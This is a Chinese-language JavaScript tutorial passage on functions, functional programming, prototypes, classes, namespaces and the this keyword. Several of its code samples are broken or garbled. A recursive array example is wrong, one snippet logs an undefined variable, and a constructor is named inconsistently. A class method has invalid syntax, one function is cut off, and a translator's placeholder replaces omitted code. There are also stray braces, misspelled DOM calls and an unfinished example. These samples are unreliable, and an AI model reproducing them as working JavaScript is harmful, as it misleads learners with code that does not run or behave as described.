  \ bind 示例：**\n\n```javascript\nVersion ≥ 5\n\nECMAScript 5 引入了除了 `call()` 和 `apply()`\
  \ 之外的名为 `bind()` 的方法，用于显式设置函数的 `this` 值。其他参数代表新函数的参数。\n\n```javascript\nfunction\
  \ showName(label) {\n  console.log(label + \":\" + this.name);\n}\nvar student1\
  \ = {\n  name: \"Ravi\"\n};\nvar student2 = {\n  name: \"Vinod\"\n};\n// 为 student1\
  \ 创建一个函数\nvar showName1 = showName.bind(student1);\nshowName1(\"student1\"); //\
  \ 输出 \"student1:Ravi\"\n\n// 为 student2 创建一个函数\nvar showName2 = showName.bind(student2,\
  \ \"student2\");\nshowName2(); // 输出 \"student2:Vinod\"\n\n// 将方法附加到对象不会改变该方法的 `this`\
  \ 值\nstudent2.sayName = showName1;\nstudent2.sayName(\"student2\"); // 输出 \"student2:Ravi\"\
  \n```\n\n### Section 19.10: 部分应用\n\n与柯化类似，部分应用用于减少传递给函数的参数数量。与柯化不同，参数数量不需要每次减少一。\n\
  \n示例：\n\n这个函数\n\n```javascript\nfunction multiplyThenAdd(a, b, c) {\n  return a\
  \ * b + c;\n}\n```\n\n... 可以用来创建另一个函数，该函数将始终乘以 2 然后对传递的值加 10；\n\n```javascript\n\
  function reversedMultiplyAdd(c, b, a) {\n  return a * b + c;\n}\nfunction factory(b,\
  \ c) {\n  return reversedMultiplyAdd.bind(null, c, b);\n}\nvar multiplyTwoThenAddTen\
  \ = factory(2, 10);\nmultiplyTwoThenAddTen(10); // * 30*\n``` 部分应用的“应用”部分意味着固定函数的参数。\n\
  \n### Section 19.11: 按引用或值传递参数\n\n在 JavaScript 中，所有参数都是按值传递的。当函数给参数变量分配新值时，该更改对调用者是不可见的：\n\
  \n```javascript\nvar obj = {a: 2};\nfunction myfunc(arg){\n  arg = {a: 5}; // *\
  \ 注意赋值是针对参数变量本身的*\n}\nmyfunc(obj);\nconsole.log(obj.a); // * 2*\n```\n\n\n\n然而，对此类参数的（嵌套）属性的修改，对调用者是可见的：\n\
  \n```javascript\nvar obj = {a: 2};\n\nfunction myfunc(arg){\n  arg.a = 5; // 给参数的属性赋值\n\
  }\n\nmyfunc(obj);\n\nconsole.log(obj.a); // 5\n```\n\n这可以视为一种*引用传递*（call by reference）：虽然函数无法通过给对象赋新值来改变调用者的对象，但它可以*修改*（mutate）调用者的对象。\n\
  \n由于原始值参数（如数字或字符串）是不可变的，函数没有办法变异它们：\n\n```javascript\nvar s = 'say';\n\nfunction\
  \ myfunc(arg){\n  arg += ' hello'; // 给参数变量本身赋值\n}\n\nmyfunc(s);\n\nconsole.log(s);\
  \ // 'say'\n```\n\n当函数想要变异作为参数传递的对象，但又不想实际修改调用者的对象时，应该对参数变量重新赋值：\n\nVersion ≥ 6\n\
  \n```javascript\nvar obj = {a: 2, b: 3};\n\nfunction myfunc(arg){\n  arg = Object.assign({},\
  \ arg); // 给参数变量赋值，浅拷贝\n  arg.a = 5;\n}\n\nmyfunc(obj);\n\nconsole.log(obj.a); //\
  \ 2\n```\n\n作为地变异参数的替代方案，函数可以根据参数创建一个新值并返回它。调用者随后将其赋值，甚至是赋值给作为参数传递的原始变量：\n\n```javascript\n\
  var a = 2;\n\nfunction myfunc(arg){ \n  arg++;\n  return arg;\n}\n\na = myfunc(a);\n\
  \nconsole.log(obj.a); // 3\n```\n\n### 章节 19.12：函数参数、“arguments\" 对象、剩余参数和展开参数\n\
  \n函数可以以变量的形式接收输入，这些变量可以在自己的作用域内使用和赋值。以下函数接收两个数值并返回它们的和：\n\n```javascript\nfunction\
  \ addition (argument1, argument2){ \n  return argument1 + argument2;\n}\n\nconsole.log(addition(2,\
  \ 3)); // -> 5\n```\n\n**arguments 对象**\n\n`arguments` 对象包含了所有包含非默认值的函数参数。即使在参数没有显式声明的情况下，也可以使用它：\n\
  \n```javascript\n(function() { console.log(arguments) })(0,'str', [2,{3}]) // ->\
  \ [0, \"str\", Array[2]]\n```\n\n虽然在打印参数时输出看起来像数组，但它实际上是一个对象：\n\n```javascript\n\
  (function() { console.log(typeof arguments) })(); // -> object\n```\n\n**剩余参数（Rest\
  \ parameters）：function (...parm) {}**\n\n在 ES6 中，当在函数参数声明中使用 `...` 语法时，它会将右侧的变量转换为单个对象，其中包含了声明参数之后提供的所有剩余参数。这允许使用无限数量的参数调用函数，这些参数将成为该变量的一部分：\n\
  \n```javascript\n(function(a, ...b){console.log(typeof b+': '+b[0]+b[1]+b[2]) })(0,1,'2',[3],{i:4});\
  \ // -> object: 123\n```\n\n**展开参数（Spread parameters）：function_name(...varb);**\n\
  \n在 ES6 中，在调用函数时也可以通过在对象/变量的右侧使用 `...` 语法。这允许将该对象的元素作为一个整体对象传递给函数：\n\n```javascript\n\
  let nums = [2,42,1];\n\nconsole.log(...['a','b','c'], Math.max(...nums)); // ->\
  \ a b c 42\n```\n\n### 章节 19.13：函数组合\n\n将多个函数组合成一个是函数编程中的常见做法；\n\n组合使得了一个流水线，数据将通过其中并进行修改，而只需对函数组合进行操作（就像将轨道碎片拼接在一起一样)...\n\
  \n你从一些单一职责函数开始：\n\nVersion ≥ 6\n\n```javascript\nconst capitalize = x => x.replace(/^\\\
  w*/, m => m.toUpperCase());\n\nconst sign = x => x + ',\\nmade with love';\n```\n\
  \n并轻松地创建一个转换轨道：\n\nVersion ≥ 6\n\n```javascript\nconst formatText = compose(capitalize,\
  \ sign);\n\nformatText ('this is an example') //This is an example, // made with\
  \ love\n```\n\n注意：组合是通过通常称为 `compose` 的实用函数实现的，如我们的示例所示。`compose` 的实现存在于许多 JavaScript\
  \ 实用库（lodash, rambda 等）中，但你也可以从简单的实现开始，例如：\n\nVersion ≥ 6\n\n```javascript\nconst\
  \ compose = (...funs) => x =>\n  funs.reduce((ac, f) => f(ac), x);\n```\n\n### 章节\
  \ 19.14：获取函数对象的名称\n\nVersion ≥ 6\n\n**ES6**:\n\n```javascript\nmyFunction.name\n\
  ```\n\nMDN 上的解释。从 2015 年起在 Node.js 和除 IE 以外的所有浏览器中均有效。\n\nVersion ≥ 5\n\n**ES5**:\n\
  \n如果你有一个对函数的引用，可以这样做：\n\n```javascript\nfunction functionName( func ) {\n  // 匹配：\n\
  \  // - ^ 字符串开头\n  // - function 单词 'function'\n  // - \\s+ 至少一些空格\n  // - ([\\\
  w\\$]+) 捕获一个或多个有效的 JavaScript 标识符字符 // - \\( 后面跟着左括号\n```\n\n### 章节 19.15：递归函数\n\
  \n递归函数是指会调用自身的函数。\n\n```javascript\nfunction factorial(n) {\n  if (n <= 1) {\n \
  \   return 1;\n  }\n  return n * factorial(n - 1);\n}\n```\n\n另一个是处理数组的递归示例：\n\n\
  ```javascript\nfunction countEvens(arr) {\n  if (arr.length === 0) {\n    return\
  \ 0;\n  }\n  return 1 + countEvens(arr.shift());\n}\n```\n\n### 章节 19.16：使用 return\
  \ 语句\n\n`return` 语句可以作为创建输出的有效方法。如果你还不知道函数将在什么语文中使用，`return` 语句特别有用。\n\n//一个接收字符串作为输入并返回字符串第一个字符的示例函数。\n\
  \n```javascript\nfunction firstChar(stringIn){\n  return stringIn.charAt(0);\n}\n\
  ```\n\n现在使用这个函数，你需要将其放在代码其他地方变量的位置：\n\n**将函数结果作为另一个函数的参数：**\n\n```javascript\nconsole.log(firstChar(\"\
  Hello world\"));\n```\n\n*输出将为：*\n\n> H\n\n**return 语句结束函数**\n\n如果我们在开头修改函数，就可以证明\
  \ `return` 语句会结束函数。\n\n```javascript\nfunction firstChar(stringIn){\n  console.log(\"\
  第一个字符的第一个操作\");\n  return stringIn.charAt(0);\n  console.log(\"第一个字符的最后一个操作\");\n\
  }\n```\n\n像这样运行此函数将如下：\n\n```javascript\nconsole.log(firstChar(\"JS\"));\n```\n\n\
  *输出：*\n\n> 第一个字符的第一个操作 > J\n\n**跨多行的 return 语句：**\n\n在 JavaScript 中，通常可以将一行代码分成多行以为了可读性或组织。这是有效的\
  \ JavaScript：\n\n```javascript\nvar name = \"bob\", age = 18;\n```\n\n当 JavaScript\
  \ 看到不完整的语句（如 `var`），它会查看下一行来完成自身。然而，如果你在 `return` 语句上犯同样的错误，你将得预期的结果。\n\n```javascript\n\
  return\n\n\"Hi, my name is \"+ name + \". \" + \"I'm \"+ age + \" years old.\";\n\
  ```\n\n这段代码将返回 **undefined**，因为 `return` 本身在 JavaScript 中是一个完整的语句，所以它不会查看下一行来完成自身。如果你需要将\
  \ **return** 语句分成多行，请在拆分之前将 return 放在一个值旁边，如下所示。\n\n\n\n\n\n```javascript\nreturn\
  \ \"Hi, my name is \" + name + \". \" + \"I'm \" + age + \" years old.\";\n```\n\
  \n### 章节 19.17: 作为变量的函数\n\n普通的函数声明看起来所示：\n\n```javascript\nfunction foo(){\n\n}\n\
  ```\n\n这样定义的函数可以通过其名称在作用域内的任何地方访问。但有时，将函数引用视为对象引用处理是很有用的。例如，你可以根据某些条件将对象赋值给变量，然后稍后从其中一个对象中检索属性：\n\
  \n```javascript\nvar name = 'Cameron';\n\nvar spouse;\n\nif ( name === 'Taylor'\
  \ ) spouse = { name: 'Jordan' };\n\nelse if ( name === 'Cameron' ) spouse = { name:\
  \ 'Casey' };\n\nvar spouseName = spouse.name;\n```\n\n在 JavaScript 中，你可以对函数执行相同的操作：\n\
  \n示例 1\n\n```javascript\nvar hashAlgorithm = 'sha1'; var hash;\n\nif ( hashAlgorithm\
  \ === 'sha1' ) hash = function(value){ /*...*/ }; else if ( hashAlgorithm === 'md5'\
  \ ) hash = function(value){ /*...*/ };\n\nhash('Fred');\n```\n\n在上面的示例中，`hash` 是一个普通变量。它被赋值了一个函数的引用，赋值后可以使用括号调用它引用的函数，就像调用普通的函数声明一样。\n\
  \n上面的示例引用了匿名函数……即没有自己名字函数。你也可以使用变量来引用命名函数。上面的示例可以重写为：\n\n示例 2\n\n```javascript\n\
  var hashAlgorithm = 'sha1'; var hash;\n\nif ( hashAlgorithm === 'sha1' ) hash =\
  \ sha1Hash; else if ( hashAlgorithm === 'md5' ) hash = md5Hash;\n\nhash('Fred');\n\
  \nfunction md5Hash(value){ /* ...*/\n\n}\n\nfunction sha1Hash(value){ /* ...*/\n\
  }\n```\n\n或者，你可以从对象的属性赋值函数引用：\n\n示例 3\n\n```javascript\nvar hashAlgorithms = {\n\
  \nsha1: function(value) { /*...*/ },\n\nmd5: function(value) { /*...*/ } };\n\n\
  var hashAlgorithm = 'sha1'; var hash;\n\nif ( hashAlgorithm === 'sha1' ) hash =\
  \ hashAlgorithms.sha1; else if ( hashAlgorithm === 'md5' ) hash = hashAlgorithms.md5;\n\
  \nhash('Fred');\n```\n\n你可以通过省略括号将一个变量持有的函数引用赋值给另一个变量。这可能会导致一个容易犯的错误：尝试将函数的返回值赋值给另一个变量，却不小心地赋值了函数的引用。\n\
  \n示例 4\n\n```javascript\nvar a = getValue;\n\nvar b = a; // b 现在是指向 getValue 的引用。\n\
  \nvar c = b(); // b 被调用，所以 c 现在持有 getValue 返回的值 (41)\n\nfunction getValue(){ return\
  \ 41;\n\n}\n```\n\n函数的引用就像任何其他值一样。正如你所见的，引用可以赋值给变量，而该变量的引用值随后可以赋值给其他变量。你可以像传递任何其他值一样传递函数的引用，包括将函数引用作为另一个函数的返回值传递。例如：\n\
  \n示例 5\n\n```javascript\n// getHashingFunction 返回一个函数，该函数被赋值 \n// 给 hash 以供以后使用：\n\
  \nvar hash = getHashingFunction( 'sha1' );\n\n// ...\n\nhash('Fred');\n\n// 返回对应于给定\
  \ algorithmName 的函数 \nfunction getHashingFunction( algorithmName ){\n\n// 返回一个匿名函数的引用\n\
  \nif(algorithmName === 'sha1') return function(value){ /*...*/ };\n\n// 返回一个声明函数的引用\n\
  \nelse if (algorithmName === 'md5') return md5;\n\n}\n\nfunction md5Hash(value){\
  \ /* ...*/\n}\n```\n\n你不需要将函数引用赋值给变量就可以调用它。这个示例基于示例 5，它将调用 `getHashingFunction`\
  \ 然后立即调用返回的函数，并将其返回值传递给 `hashedValue`。\n\n示例 6\n\n```javascript\nvar hashedValue\
  \ = getHashingFunction( 'sha1' )( 'Fred' );\n```\n\n**关于提升（Hoisting）的说明**\n\n请记住，与普通函数声明不同，引用函数的变量不是被“提升”的。在示例\
  \ 2 中，`md5Hash` 和 `sha1Hash` 函数定义在脚本的底部，但它们处处都是可用的。无论你在哪里定义函数，解释器都会将其“提升”到作用域的顶部，使其立即可用。对于变量定义，情况**不是**这样，因此下面的代码将会报错：\n\
  \n```javascript\nvar functionVariable;\n\nhoistedFunction(); // 正常工作，因为函数被“提升”到了作用域的顶部\n\
  functionVariable(); // 错误：undefined is not a function.\n\nfunction hoistedFunction(){}\
  \ functionVariable = function(){};\n```\n\n### 章节 20: 函数式 JavaScript\n\n#### 章节\
  \ 20.1: 高阶函数\n\n通常，通过将其他函数作为参数或返回它们（或两者兼有）来操作的函数被称为高阶函数。\n\n高阶函数是可以接收另一个函数作为参数的函数。当你传递回调函数时，你正在使用高阶函数。\n\
  \n```javascript\nfunction iAmCallbackFunction() {\n\nconsole.log(\"callback has\
  \ been invoked\");\n}\n\nfunction iAmJustFunction(callbackFn) {\n// 做一些事情 ...\n\
  // 调用回调函数。\ncallbackFn();\n}\n\n// 使用回调函数调用你的高阶函数。\niAmJustFunction(iAmCallbackFunction);\n\
  ```\n\n高阶函数也是返回另一个函数作为结果的函数。\n\n```javascript\nfunction iAmJustFunction() { // 做一些事情\
  \ ...\n// 返回一个函数。\nreturn function iAmReturnedFunction() {\n\nconsole.log(\"returned\
  \ function has been invoked\"); }\n}\n\n// 调用你的高阶函数及其返回的函数。\niAmJustFunction()();\n\
  ```\n\n### 章节 20.2: 恒等函（Identity Monad）\n\n这是 JavaScript 中实现恒等函的一个示例，可以作为创建其他单子的起点。\n\
  \n基于 Douglas Crockford 关于 monads 和 gonads 的会议\n\n使用这种方法，复用你的函数将变得更容易，因为这种单子提供了灵活性，避免了组合的噩梦：\n\
  \n`f(g(h(i(j(k(value), j1), i2), h1, h2), g1, g2), f1, f2)`\n\n可读性好、漂亮整洁：\n\n```javascript\n\
  identityMonad (value)\n.bind(k)\n.bind(j, j1, j2)\n.bind(i, i2)\n.bind(h, h1, h2)\
  \ .bind(g, g1, g2) .bind(f, f1, f2);\n```\n\n```javascript\nfunction identityMonad(value)\
  \ { var monad = Object.create(null);\n\n// func 应该返回一个 monad\nmonad.bind = function\
  \ (func, ...args) { return func(value, ...args); };\n\n// 无论 func 做什么，我们都能得到我们的\
  \ monad\nmonad.call = function (func, ...args) { func(value, ...args);\n\nreturn\
  \ identityMonad(value); };\n\n// func 不需要知道关于 monad 的任何信息\nmonad.apply = function\
  \ (func, ...args) { return identityMonad(func(value, ...args)); };\n\n// 获取包装在这个\
  \ monad 中的值\nmonad.value = function () {\n\nreturn value;\n};\n\nreturn monad; };\n\
  ```\n\n它适用于原始类型值\n\n```javascript\nvar value = 'foo',\n\nf = x => x + ' changed',\
  \ g = x => x + ' again';\n\nidentityMonad (value)\n.apply(f)\n.apply(g)\n.bind(alert);\
  \ // 弹出 'foo changed again'\n```\n\n适用于对象\n\n```javascript\nvar value = { foo: 'foo'\
  \ },\n\nf = x => identityMonad(Object.assign(x, { foo: 'bar' })), g = x => Object.assign(x,\
  \ { bar: 'foo' }),\n\nh = x => console.log('foo: ' + x.foo + ', bar: ' + x.bar);\n\
  \nidentityMonad (value)\n.bind(f)\n.apply(g)\n.bind(h); // 打印 'foo: bar, bar: foo'\n\
  ```\n\n让我们尝试一切：\n\n```javascript\nvar add = (x, ...args) => x + args.reduce((r,\
  \ n) => r + n, 0), multiply = (x, ...args) => x * args.reduce((r, n) => r * n, 1),\
  \ divideMonad = (x, ...args) => identityMonad(x / multiply(...args)), log = x =>\
  \ console.log(x),\n\nsubstract = (x, ...args) => x - add(...args);\n\nidentityMonad\
  \ (100)\n.apply(add, 10, 29, 13) .apply(multiply, 2)\n.bind(divideMonad, 2)\n.apply(substract,\
  \ 67, 34) .apply(multiply, 1239)\n.bind(divideMonad, 20, 54, 2)\n.apply(Math.round)\n\
  .call(log); // 打印 29\n```\n\n\n\n\n\n函数式编程的一个基本原则是避免改变应用状态（无状态性）以及其作用范围外的变量（不可变性）。\n\
  \n纯函数是指具有以下特征的函数：\n- 给定输入总是返回相同的输出\n- 它们不依赖作用范围之外的任何变量\n- 它们不修改应用状态（无副作用\n\n让我们来看一些例子：\n\
  \n### 纯函数不能改变其作用范围外的任何变量\n\n不纯函数\n```javascript\nlet obj = { a: 0 }\nconst impure\
  \ = (input) => {\n  // 修改了 input.a\n  input.a = input.a + 1;\n  return input.a;\n\
  }\n\nlet b = impure(obj)\nconsole.log(obj) // 输出 { \"a\": 1 }\nconsole.log(b) //\
  \ 输出 1\n```\n该函数改变了其作用范围外的 `obj.a` 值。\n\n纯函数\n```javascript\nlet obj = { a: 0 }\n\
  const pure = (input) => {\n  // 没有修改 obj\n  let output = input.a + 1;\n  return\
  \ output;\n}\n\nlet b = pure(obj)\nconsole.log(obj) // 输出 { \"a\": 0 }\nconsole.log(b)\
  \ // 输出 1\n```\n该函数没有改变对象 `obj` 的值。\n\n### 纯函数不能依赖其作用范围外的变量\n\n不纯函数\n```javascript\n\
  let a = 1;\nlet impure = (input) => {\n  // 与函数作用外的变量相乘\n  let output = input *\
  \ a;\n  return output\n}\n\nconsole.log(impure(2)) // 输出 2\na++; // a 变为 2\nconsole.log(impure(2))\
  \ // 输出 4\n```\n这个不纯函数依赖于定义在其作用范围外的变量 `a`。因此，如果 `a` 被修改，`impure` 函数的结果将会不同。\n\n\
  纯函数\n```javascript\nlet pure = (input) => {\n  let a = 1;\n  // 与函数范围内的变量相乘\n  let\
  \ output = input * a;\n  return output;\n}\n\nconsole.log(pure(2)) // 输出 2\n```\n\
  纯函数的结果不依赖于其作用范围外的任何变量\n\n### 第 20.4 节：接受函数作为参数\n\n```javascript\nfunction transform(fn,\
  \ arr) {\n  let result = [];\n  for (let el of arr) {\n    result.push(fn(el));\
  \ // 将转换后的项的结果推入 result \n  }\n  return result;\n}\n\nconsole.log(transform(x =>\
  \ x * 2, [1,2,3,4])); // [2, 4, 6, 8]\n```\n如你所见，我们的 `transform` 函数接受两个参数：一个函数和一个集合。它将遍历集合，并将值推入结果中，对其中的每个值调用\
  \ `fn`。\n\n看起来眼熟吗？这与 `Array.prototype.map()` 的工作方式非常相似！\n```javascript\nconsole.log([1,\
  \ 2, 3, 4].map(x => x * 2)); // [2, 4, 6, 8]\n```\n\n### 第 21 章：原型、对象\n\n在传统的 JS\
  \ 中没有类（class），我们拥有的是原型（prototype）。像类一样，原型继承了类中声明的属性，包括方法和变量。我们可以在需要时通过 `Object.create(PrototypeName)`\
  \ 创建对象的新实例（我们也可以为构造函数提供值）。\n\n### 第 21.1 节：原型的创建与初始化\n\n```javascript\nvar Human\
  \ = function() {\n  this.canWalk = true;\n  this.canSpeak = true;\n};\n\nPerson.prototype.greet\
  \ = function() {\n  if (this.canSpeak) {\n    // 检查此原型是否有 speak 的实例\n    this.name\
  \ = \"Steve\"\n    console.log('Hi, I am ' + this.name);\n  } else {\n    console.log('Sorry\
  \ i can not speak');\n  }\n};\n```\n原型可以这样实例化：\n```javascript\nobj = Object.create(Person.prototype);\n\
  ob.greet();\n```\n我们可以为构造函数传递值，并根据需求将布尔值设为 true 或 false。\n\n#### 详细解释\n\n```javascript\n\
  var Human = function() {\n  this.canSpeak = true;\n};\n\n// 基础 greet 函数，根据 canSpeak\
  \ 标志进行问候\nHuman.prototype.greet = function() {\n  if (this.canSpeak) {\n    console.log('Hi,\
  \ I am ' + this.name);\n  }\n};\n\nvar Student = function(name, title) {\n  Human.call(this);\
  \ // 实例化 Human 对象并获取类的成员\n  this.name = name; // 从 human 类继承 name\n  this.title\
  \ = title;\n};\n\n// ... (注：此处后续代码块逻辑与原文一致，保持格式不变)\n```\n\n\n\n这是一个示例类，它为其 `.name`\
  \ 属性提供了 getter 和 setter。每当被赋值时，我们都会将新名称记录在一个内部的 `.names_` 数组中。每当被访问时，我们都会返回最近的名称。\n\
  \n```javascript\nclass MyClass {\n  constructor() {\n    this.names_ = [];\n  }\n\
  \n  set name(value) {\n    this.names_.push(value);\n  }\n\n  get name() {\n   \
  \ return this.names_[this.names_.length-1];\n  }\n}\n\nconst myClassInstance = new\
  \ MyClass();\nmyClassInstance.name = 'Joe';\nmyClassInstance.name = 'Bob';\nconsole.log(myClassInstance.name);\
  \ // logs: \"Bob\"\nconsole.log(myClassInstance.names_); // logs: [\"Joe\", \"Bob\"\
  ]\n```\n\n如果你只定义了 setter，尝试访问该属性将始终返回 `undefined`。\n\n```javascript\nconst classInstance\
  \ = new class {\n  set prop(value) {\n    console.log('setting', value);\n  }\n\
  };\n\nclassInstance.prop = 10; // logs: \"setting\", 10\nconsole.log(classInstance.prop);\
  \ // logs: undefined\n```\n\n如果你只定义了 getter，尝试赋值该属性将没有任何效果。\n\n```javascript\nconst\
  \ classInstance = new class {\n  get prop() {\n    return 5;\n  }\n};\n\nclassInstance.prop\
  \ = 10;\nconsole.log(classInstance.prop); // logs: 5\n```\n\n### 第 22.5 节：私有成员\n\
  \nJavaScript 技术上并不支持作为语言特性的私有成员。Douglas Crockford 所描述的隐私性是通过闭包（保留的函数作用域）模拟的，闭包会在每次调用构造函数实例化时生成一个。\n\
  \n`Queue` 示例演示了如何通过构造函数保留本地状态，并允许特权方法对其进行访问。\n\n```javascript\nclass Queue {\n \
  \ constructor () {\n    // - 每次实例化都会生成一个闭包\n    const list = []; // - 本地状态 (\"私有成员\"\
  )\n    this.enqueue = function (type) {\n      // - 特权公共方法 // 访问本地状态\n      list.push(type);\
  \ // 类似于“写入”\n      return type;\n    };\n\n    this.dequeue = function () {\n \
  \     // - 特权公共方法 // 访问本地状态\n      return list.shift(); // 类似于“读取 / 写入”\n    };\n\
  \  }\n}\n\nvar q = new Queue;\nq.enqueue(9); // ... 先入 ...\nq.enqueue(8);\nq.enqueue(7);\n\
  console.log(q.dequeue()); // 9 ... 先出。\nconsole.log(q.dequeue()); // 8\nconsole.log(q.dequeue());\
  \ // 7\nconsole.log(q); // {}\nconsole.log(Object.keys(q)); // [\"enqueue\",\"dequeue\"\
  ]\n```\n\n每次实例化 `Queue` 类型，构造函数都会生成一个闭包。\n\n因此，`Queue` 类型自身的方法 `enqueue` 和 `dequeue`（见\
  \ `Object.keys(q)`）仍然可以访问 `list`，该 `list` 继续存在于它的闭包作用域中，且该作用域在构造时被保留了。\n\n使用这种模式（通过特权公共方法模拟私有成员）时，应该记住，对于每个实例，每个自身的属性方法都会消耗额外的内存（因为这些是无法共享/重用的代码）。对于存储在此类闭包中的状态数量/大小也是如此。\n\
  \n### 第 22.6 节：方法\n\n可以在类中定义方法来执行某个功能并可选地返回结果。它们可以接收来自调用者的参数。\n\n```javascript\n\
  class Something {\n  constructor(data) {\n    this.data = data;\n  }\n\n  doSomething\
  \ (text) {\n    return {\n      data: this.data,\n      text\n    };\n  }\n}\n\n\
  var s = new Something({});\ns.doSomething(\"hi\") // returns: { data: {}, text:\
  \ \"hi\" }\n```\n\n### 第 22.7 节：动态方法名\n\n还存在在命名方法时评估表达式的能力，类似于你使用 `[]` 访问对象的属性。这对于拥有动态属性名很有用，但通常与\
  \ Symbol 结合使用。\n\n```javascript\nlet METADATA = Symbol('metadata');\n\nclass Car\
  \ {\n  constructor(make, model) {\n    this.make = make;\n    this.model = model;\n\
  \  }\n\n  // 使用 symbol 的示例\n  [ METADATA]() {\n    return {\n      make: this.make,\
  \ model: this.model\n    };\n  }\n\n  // 你也可以使用任何 JavaScript 表达式\n  // 这只是一个字符串，也可以简单地定义\
  \ add()\n   \"add\" {\n    return a + b;\n  }\n\n  // 这是动态评估的\n  [ 1 + 2]() {\n\
  \    return \"three\";\n  }\n}\n\nlet MazdaMPV = new Car(\"Mazda\", \"MPV\");\n\
  MazdaMPV.add(4, 5); // 9\nMazdaMPV[3](); // \"three\"\nMazdaMPV[METADATA](); //\
  \ { make: \"Mazda\", model: \"MPV\" }\n```\n\n### 第 22.8 节：使用类管理私有数据\n\n使用类最常见的障碍之一是找到处理私有状态的正确方法。处理私有状态有\
  \ 4 种常见的解决方案：\n\n#### 使用 Symbols\n\nSymbols 是 ES2015 中引入的新原始类型，如 MDN 定义所示。\n\nSymbol\
  \ 是一种唯一且不可变的数据类型，可用作对象属性的标识符。\n\n当使用 symbol 作为属性键时，它是不可枚举的。\n\n因此，它们不会通过 `for...in`\
  \ 或 `Object.keys` 暴露。\n\n因此，我们可以使用 symbols 来存储私有数据。\n\n```javascript\nconst topSecret\
  \ = Symbol('topSecret'); // 我们的私有密钥；仅在模块文件的作用范围内可访问\n\nexport class SecretAgent\
  \ {\n  constructor (secret) {\n    this[topSecret] = secret; // 我们将 secret 赋值给它\n\
  \  }\n}\n```\n\n\n\n}\n\n}\n\n在此示例中，数据也是 100% 私有的，且无法从类外部访问，因此我们的特工是安全的。\n\n###\
  \ 使用命名约定\n\n我们将规定任何私有属性都将以 `_` 开头。\n\n请注意，对于这种方法，数据并不是真正的私有。\n\n```javascript\n\
  export class SecretAgent{\n  constructor(secret){\n    this._topSecret = secret;\
  \ // 根据约定它是私有的 \n    this.coverStory = 'just a simple gardner'; \n    this.doMission\
  \ = () => {\n      figureWhatToDo(this_topSecret);\n    };\n  }\n}\n```\n\n### 第\
  \ 22.9 ：类名绑定\n\n`ClassDeclaration` 的 `Name` 在不同作用域中以不同的方式绑定\n\n1. 类定义所在的作用域 - `let`\
  \ 绑定\n2. 类本身的作用域 - `class {}` 内部 `{` 和 `}` 之间 - `const` 绑定\n\n```javascript\nclass\
  \ Foo {\n  // 此代码块内的 Foo 是 const 绑定\n}\n// 这里的 Foo 是 let 绑定\n```\n\n例如，\n\n```javascript\n\
  class A {\n  foo() {\n    A = null; // 在运行时会抛出错误，因为类内部 A 是 `const` 绑定 \n  }\n}\n\
  A = null; // 不报错，因为这里的 A 是 `let` 绑定\n```\n\n对于 `Function`，情况则不同\n\n```javascript\n\
  function A() {\n  A = null; // 有效\n}\nA.prototype.foo = function foo() {\n  A =\
  \ null; // 有效\n}\nA = null; // 有效\n```\n\n### 第 23 章：命名空间\n\n#### 23.1 ：通过直接赋值命名空间\n\
  \n// 之前：反模式 3 个全局变量\n\n```javascript\nvar setActivePage = function () {};\nvar getPage\
  \ = function() {};\nvar redirectPage = function() {};\n```\n\n// 之后：只有 1 个全局变量，没有函数冲突，且函数名更具意义\n\
  \n```javascript\nvar NavigationNs = NavigationNs || {};\nNavigationNs.active = function()\
  \ {}\nNavigationNs.pagination = function() {}\nNavigationNs.redirection = function()\
  \ {}\n```\n\n#### 23.2 ：嵌套命名空间\n\n当涉及多个模块时，应通过创建一个单一全局命名空间来避免全局名称泛滥。从那里，任何子模块都可以添加到全局命名空间中。（进一步嵌套会减慢性能并增加不必要的复杂性。）如果命名冲突，可以使用较长的名称：\n\
  \n```javascript\nvar NavigationNs = NavigationNs || {}; \nNavigationNs.active =\
  \ {};\nNavigationNs.pagination = {};\nNavigationNs.redirection = {};\n\n// 第二层从这里开始。\n\
  Navigational.pagination.jquery = function(); \nNavigational.pagination.angular =\
  \ function(); \nNavigational.pagination.ember = function();\n```\n\n### 第 24 章：上下文\
  \ (this)\n\n#### 24.1 ：简单对象中的 this\n\n```javascript\nvar person = {\n  name: 'John\
  \ Doe',\n  age: 42,\n  gender: 'male',\n  bio: function() {\n    console. log('My\
  \ name is ' + this.name);\n  }\n};\n\nperson.bio(); // 打印 \"My name is John Doe\"\
  \n\nvar bio = person.bio;\nbio(); // 打印 \"My name is undefined\"\n```\n\n在上面的代码中，`person.bio`\
  \ 使用了 `context` (`this`)。当通过 `person.bio()` 调用函数时，上下文会自动传递，因此它正确地打印了 \"My name is\
  \ John Doe\"。但在将函数赋值变量时，它失去了上下文。\n\n在非严格模式下，默认上下文是全局对象（`window`）。在严格模式下，它是 `undefined`。\n\
  \n#### 24.2 ：保存 this 以供嵌套函数/对象使用\n\n一个常见的陷阱是尝试在嵌套函数或对象中使用 `this`，此时上下文已经丢失。\n\n\
  ```javascript\ndocument.getElementById('myAJAXButton').onclick = function(){\n \
  \ makeAJAXRequest(function(result){\n    if (result) { // 成功\n      this.className\
  \ = 'success';\n    }\n  })\n}\n```\n\n在这里，上下文 (`this`) 在内部回调函数中丢失了。为了纠正这一点，你可以将\
  \ `this` 的值保存在变量中：\n\n```javascript\ndocument. getById('myAJAXButton').onclick =\
  \ function(){ \n  var self = this;\n  makeAJAXRequest(function(result){\n    if\
  \ (result) { // 成功\n      self.className = 'success';\n    }\n  })\n}\n```\n\n版本\
  \ ≥ 6\n\nES6 引入了箭头函数，它包含了词法 `this` 绑定。上面的示例可以这样写：\n\n```javascript\ndocument. getById('myAJAXButton').onclick\
  \ = function(){ \n  makeAJAXRequest(result => {\n    if (result) { // 成功\n     \
  \ this.className = 'success';\n    }\n  })\n}\n```\n\n#### 24.3 ：绑定函数上下文\n\n版本 ≥\
  \ 5.1\n\n每个函数都有一个 `bind` 方法，它会创建一个包装过的函数，并以正确的上下文调用它。更多信息请见此处。\n\n```javascript\n\
  var monitor = {\n  threshold: 5,\n  check: function(value) {\n    if (value > this.threshold)\
  \ {\n      this.display(\"Value is too high!\");\n    }\n  },\n  display(message)\
  \ {\n    alert(message);\n  }\n};\n\nmonitor.check(7); //\n```\n\n### 第 25 章：Setter\
  \ 和 Getter\n\nSetter 和 Getter 是在被设置/获取时调用函数的对象属性。\n\n#### 25.1 ：使用 Object.defineProperty\
  \ 定义 Setter/Getter\n\n```javascript\nvar setValue;\nvar obj = {};\nObject.defineProperty(obj,\
  \ \"objProperty\", {\n  get : function(){\n    return \"a value\";\n  },\n  set:\
